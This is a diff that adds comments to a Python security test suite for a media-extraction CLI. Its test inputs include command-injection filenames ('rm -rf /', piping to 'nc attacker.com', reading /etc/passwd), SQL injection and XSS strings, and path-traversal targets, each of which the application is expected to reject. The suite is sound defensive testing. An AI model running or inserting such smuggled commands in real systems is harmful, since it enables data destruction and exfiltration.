@@ -157,28 +157,31 @@ class TestInputValidation(E2ETestBase, CLITestMixin, SecurityTestMixin):
 
         Ensures failures are due to file validation, not command execution errors.
         """
+        # Command injection attack vectors using various shell metacharacters
         injection_attempts = [
-            "file.mp4; rm -rf /",
-            "file.mp4 && cat /etc/passwd",
-            "file.mp4 | nc attacker.com 1234",
-            "file.mp4 $(whoami)",
-            "file.mp4 `id`",
-            "file.mp4'; DROP TABLE users; --",
-            "file.mp4 & calc.exe",  # Windows
-            "file.mp4 || cat /etc/hosts"
+            "file.mp4; rm -rf /",                   # Command chaining with semicolon
+            "file.mp4 && cat /etc/passwd",          # AND operator for command chaining
+            "file.mp4 | nc attacker.com 1234",      # Piping to network command (data exfiltration)
+            "file.mp4 $(whoami)",                   # Command substitution (modern syntax)
+            "file.mp4 `id`",                        # Command substitution (backtick syntax)
+            "file.mp4'; DROP TABLE users; --",      # SQL injection attempt in filename
+            "file.mp4 & calc.exe",                  # Windows background execution
+            "file.mp4 || cat /etc/hosts"            # OR operator for command chaining
         ]
         
         for injection_attempt in injection_attempts:
             with self.subTest(injection=injection_attempt):
                 # Test with extract command
                 result = self.run_extract_command(input_file=injection_attempt)
-                
+
+                # Command injection should be prevented - the operation must fail
                 assert not result.success, f"Command injection should fail: {injection_attempt}"
-                
-                # Error should be about file not found, not command execution
+
+                # Critical: error should be about file validation, not command execution
+                # If error mentions "command", "shell", etc., it suggests the app tried to execute it
                 error_msg = result.error.lower()
                 command_indicators = ["executed", "command", "shell", "bash", "cmd"]
-                
+
                 for indicator in command_indicators:
                     assert indicator not in error_msg, \
                         f"Error suggests command execution: {error_msg}"
@@ -199,16 +202,17 @@ class TestInputValidation(E2ETestBase, CLITestMixin, SecurityTestMixin):
         Ensures the application either sanitizes these safely or fails gracefully
         without exposing internal error details.
         """
+        # Collection of special characters and dangerous filename patterns
         special_filenames = [
-            "test@#$%^&*().mp4",
-            "test file with spaces.mp4",
-            "test\x00null.mp4",  # Null byte
-            "test\n\r\t.mp4",    # Control characters
-            "test<script>alert('xss')</script>.mp4",
-            "test\u202e.mp4",    # Right-to-left override
-            "test.mp4.exe",      # Double extension
-            "CON.mp4",           # Windows reserved name
-            "aux.mp4",           # Windows reserved name
+            "test@#$%^&*().mp4",                        # Special characters that might break parsing
+            "test file with spaces.mp4",                # Spaces (can break shell commands)
+            "test\x00null.mp4",                         # Null byte (can truncate strings in C-based libs)
+            "test\n\r\t.mp4",                           # Control characters (newline, carriage return, tab)
+            "test<script>alert('xss')</script>.mp4",   # XSS attempt in filename
+            "test\u202e.mp4",                           # Right-to-left override (can hide real extension)
+            "test.mp4.exe",                             # Double extension (social engineering)
+            "CON.mp4",                                  # Windows reserved device name
+            "aux.mp4",                                  # Windows reserved device name
         ]
         
         for filename in special_filenames:
@@ -266,24 +270,27 @@ class TestInputValidation(E2ETestBase, CLITestMixin, SecurityTestMixin):
         Ensures that Unicode handling doesn't cause encoding errors that could
         expose internal system details or crash the application.
         """
+        # Unicode characters that may cause encoding issues or security vulnerabilities
         unicode_filenames = [
-            "test_файл.mp4",           # Cyrillic
-            "test_文件.mp4",            # Chinese
-            "test_テスト.mp4",          # Japanese
-            "test_🎵🎧.mp4",          # Emoji
-            "test_\u200d.mp4",        # Zero-width joiner
-            "test_\ufeff.mp4",        # Byte order mark
+            "test_файл.mp4",           # Cyrillic characters (multi-byte encoding)
+            "test_文件.mp4",            # Chinese characters (CJK, complex encoding)
+            "test_テスト.mp4",          # Japanese characters (multiple encodings possible)
+            "test_🎵🎧.mp4",          # Emoji (UTF-8 4-byte sequences)
+            "test_\u200d.mp4",        # Zero-width joiner (invisible, can hide content)
+            "test_\ufeff.mp4",        # Byte order mark (BOM, can cause encoding confusion)
         ]
         
         for filename in unicode_filenames:
             with self.subTest(filename=filename):
                 result = self.run_extract_command(input_file=filename)
-                
+
                 # Should fail gracefully without encoding errors
                 if not result.success:
                     error_msg = result.error.lower()
+                    # Check that error doesn't expose encoding implementation details
+                    # Such errors could reveal internal library choices or Python version
                     encoding_errors = ["encoding", "unicode", "decode", "ascii"]
-                    
+
                     for error_type in encoding_errors:
                         assert error_type not in error_msg, \
                             f"Unicode filename caused encoding error: {error_msg}"
@@ -494,18 +501,21 @@ class TestOutputSanitization(E2ETestBase, CLITestMixin, SecurityTestMixin, MockP
         )
         
         if result.success and output_file.exists():
-            # Check file permissions
+            # Check file permissions for security best practices
             file_mode = output_file.stat().st_mode
-            
-            # Should not be world-writable
+
+            # Critical security check: world-writable files can be modified by any user
+            # This could allow malicious users to replace content or inject code
             assert not (file_mode & 0o002), "Output file should not be world-writable"
-            
-            # Should be readable by owner
+
+            # Verify owner can read their own output file
             assert file_mode & 0o400, "Output file should be readable by owner"
-            
+
             # On Unix systems, check specific permission patterns
             if os.name == 'posix':
                 # Should have reasonable permissions (e.g., 644 or 600)
+                # 644 = rw-r--r-- (owner write, group/others read)
+                # 600 = rw------- (owner only)
                 perms = file_mode & 0o777
                 acceptable_perms = [0o644, 0o600, 0o640, 0o664]
                 assert perms in acceptable_perms, f"Unexpected file permissions: {oct(perms)}"
@@ -610,13 +620,14 @@ class TestAPIKeySecurity(E2ETestBase, CLITestMixin, SecurityTestMixin):
     
     def test_api_key_validation(self):
         """Test API key validation and sanitization."""
+        # Invalid API key patterns that should be rejected
         invalid_keys = [
-            "",                    # Empty key
-            "   ",                # Whitespace only
-            "invalid key",        # Spaces in key
-            "key\nwith\nnewlines", # Control characters
-            "a" * 1000,          # Extremely long key
-            "<script>alert('xss')</script>", # XSS attempt
+            "",                                     # Empty key (no authentication)
+            "   ",                                  # Whitespace only (effectively empty)
+            "invalid key",                          # Spaces in key (malformed)
+            "key\nwith\nnewlines",                 # Control characters (injection attempt)
+            "a" * 1000,                             # Extremely long key (buffer overflow attempt)
+            "<script>alert('xss')</script>",       # XSS attempt in API key
         ]
         
         for invalid_key in invalid_keys:
@@ -734,12 +745,13 @@ class TestFileSystemSecurity(E2ETestBase, CLITestMixin, SecurityTestMixin):
         
         input_file = self.test_files["short"]
         
+        # Malicious output paths attempting to write outside allowed directories
         malicious_outputs = [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\malicious.mp3",
-            "/etc/shadow",
-            "/root/malicious.mp3",
-            "~/../../etc/hosts",
+            "../../../etc/passwd",                           # Unix directory traversal
+            "..\\..\\..\\windows\\system32\\malicious.mp3",  # Windows traversal to system directory
+            "/etc/shadow",                                   # Absolute path to sensitive file
+            "/root/malicious.mp3",                           # Absolute path to root's home
+            "~/../../etc/hosts",                             # Tilde expansion with traversal
         ]
         
         for malicious_output in malicious_outputs:
@@ -755,16 +767,18 @@ class TestFileSystemSecurity(E2ETestBase, CLITestMixin, SecurityTestMixin):
                     malicious_path = Path(malicious_output)
                     if malicious_path.exists():
                         # If file exists, it should be in a safe location
+                        # Use resolve() to canonicalize paths and prevent symlink tricks
                         resolved_path = malicious_path.resolve()
                         temp_dir_resolved = self.temp_dir.resolve()
-                        
-                        # Should be within temp directory or output directory
+
+                        # Security check: verify the file is within approved directories
+                        # This prevents directory traversal from writing outside the sandbox
                         safe_parents = [temp_dir_resolved, self.output_dir.resolve()]
                         is_safe = any(
                             str(resolved_path).startswith(str(safe_parent))
                             for safe_parent in safe_parents
                         )
-                        
+
                         assert is_safe or not malicious_path.exists(), \
                             f"Malicious output path created: {resolved_path}"
                 else:
@@ -781,13 +795,13 @@ class TestFileSystemSecurity(E2ETestBase, CLITestMixin, SecurityTestMixin):
         
         input_file = self.test_files["short"]
         
-        # Try to overwrite important system files (should fail)
+        # Critical system files that should never be overwritten by the application
         system_files = [
-            "/etc/passwd",
-            "/etc/hosts",
-            "/bin/sh",
-            "C:\\Windows\\System32\\drivers\\etc\\hosts",
-            "C:\\Windows\\System32\\kernel32.dll",
+            "/etc/passwd",                                  # Unix user database
+            "/etc/hosts",                                   # DNS resolution file
+            "/bin/sh",                                      # System shell binary
+            "C:\\Windows\\System32\\drivers\\etc\\hosts",  # Windows DNS resolution
+            "C:\\Windows\\System32\\kernel32.dll",         # Critical Windows system library
         ]
         
         for system_file in system_files:
